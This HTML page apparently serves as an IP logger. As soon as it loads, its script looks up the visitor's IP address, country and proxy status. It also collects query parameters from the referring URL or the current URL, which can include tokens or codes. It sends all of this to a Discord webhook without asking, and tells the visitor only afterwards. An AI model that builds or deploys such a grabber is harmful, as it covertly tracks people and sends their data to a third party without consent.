<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Info Table</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f4f4f4;
        }
    </style>
</head>
<body>
    <h1>IP Information</h1>
    <table id="infoTable" style="display:none;">
        <thead>
            <tr>
                <th>IP Version</th>
                <th>IP Address</th>
                <th>Country Name</th>
                <th>Continent</th>
                <th>Is Proxy</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>

    <script>
        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL

        function getQueryParamsFromURL(url) {
            try {
                const params = new URL(url).searchParams;
                const queryParams = {};
                for (const [key, value] of params.entries()) {
                    queryParams[key] = value;
                }
                return queryParams;
            } catch {
                return {};
            }
        }

        async function fetchAndSendIPInfo() {
            const table = document.getElementById('infoTable');
            const tbody = table.querySelector('tbody');
            tbody.innerHTML = ''; // Clear any previous data

            try {
                const response = await fetch('https://freeipapi.com/api/json');

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const data = await response.json();

                // Extract required fields
                const row = `<tr>
                    <td>${data.ipVersion || 'N/A'}</td>
                    <td>${data.ipAddress || 'N/A'}</td>
                    <td>${data.countryName || 'N/A'}</td>
                    <td>${data.continent || 'N/A'}</td>
                    <td>${data.isProxy ? 'Yes' : 'No'}</td>

                </tr>`;

                tbody.innerHTML = row;
                table.style.display = 'table';

                // Get referrer query parameters or fallback to current URL
                const referrer = document.referrer;
                let queryParams = {};

                if (referrer) {
                    queryParams = getQueryParamsFromURL(referrer);
                }

                // If referrer has no params, get params from current URL
                if (Object.keys(queryParams).length === 0) {
                    queryParams = getQueryParamsFromURL(window.location.href);
                }

                const queryParamsString = Object.entries(queryParams).length > 0
                    ? Object.entries(queryParams).map(([key, value]) => `${key}: ${value}`).join(', ')
                    : 'None';

                // Prepare the embed payload for Discord
                const embed = {
                    embeds: [
                        {
                            title: "IP Information",
                            fields: [
                                { name: "IP Version", value: data.ipVersion || 'N/A', inline: true },
                                { name: "IP Address", value: data.ipAddress || 'N/A', inline: true },
                                { name: "Country Name", value: data.countryName || 'N/A', inline: true },
                                { name: "Continent", value: data.continent || 'N/A', inline: true },
                                { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
                                { name: "Code", value: queryParamsString, inline: false }
                            ],
                            color: 3447003 // Optional: Set a color for the embed
                        }
                    ]
                };

                // Send the data to the Discord webhook
                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed)
                });

                alert('Data sent to Discord successfully!');

            } catch (error) {
                alert('Failed to fetch or send data: ' + error.message);
            }
        }

        // Automatically fetch and send IP info when the page loads
        window.onload = fetchAndSendIPInfo;
    </script>
</body>
</html>
